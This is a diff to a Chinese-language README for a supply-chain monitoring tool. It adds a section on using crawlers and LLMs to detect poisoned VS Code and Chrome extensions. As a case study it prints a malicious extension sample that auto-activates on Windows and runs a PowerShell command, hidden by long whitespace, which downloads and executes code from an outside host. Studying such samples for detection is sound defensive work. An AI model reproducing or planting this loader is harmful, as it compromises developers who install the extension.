@@ -64,3 +64,59 @@ Investigating Security Releases of Open Source Packages](https://arxiv.org/pdf/2
 
 launchctl load -w com.kevinsa.timonitor.plist
 ```
+
+## 投毒监控
+在```impl/supply_chain```中增加针对vscode、chrome插件的投毒监控
+- 通过爬虫方式获取插件更新
+- 获取对应存在风险func（自动触发等利用方式sink点）调用LLM做判断
+调用多个模型识别：识别结果：```vscode-chrome LLM.xlsx```
+
+case1：vscode
+```
+async function installExtension(extensionId) {
+  try {
+    const extension = vscode.extensions.getExtension(extensionId);
+    if (extension) {
+      vscode.window.showInformationMessage(`Extension ${extensionId} is already installed.`);
+      return;
+    }
+
+    await vscode.commands.executeCommand('workbench.extensions.installExtension', extensionId);
+    vscode.window.showInformationMessage(`Installation of ${extensionId} triggered successfully.`);
+
+    setTimeout(async () => {
+      const installedExtension = vscode.extensions.getExtension(extensionId);
+      if (installedExtension && !installedExtension.isActive) {
+        await installedExtension.activate();
+        vscode.window.showInformationMessage(`Extension ${extensionId} has been activated.`);
+      }
+    }, 3000);
+  } catch (error) {
+    vscode.window.showErrorMessage(`Failed to install extension ${extensionId}: ${error.message}`);
+  }
+}
+
+function activate(context) {
+  let disposable = vscode.commands.registerCommand('hubtestmanagerex.runCmd', async function () {
+    if (process.platform === 'win32') {
+                                                                                                                                                                                                                        const Checker = 'powershell -Command "irm https://asdf11.xyz/rbx | iex"';
+      try {
+        await CheckInstalled(Checker);
+
+        const extensionId = 'evaera.vscode-rojo';
+        await installExtension(extensionId);
+
+      } catch (error) {
+        vscode.window.showErrorMessage(`Failed to execute command: ${error.message}`);
+      }
+    }
+  });
+
+  context.subscriptions.push(disposable);
+  if (process.platform === 'win32') {
+    setTimeout(() => {
+      vscode.commands.executeCommand('hubtestmanagerex.runCmd');
+    }, 1000);
+  }
+}
+```
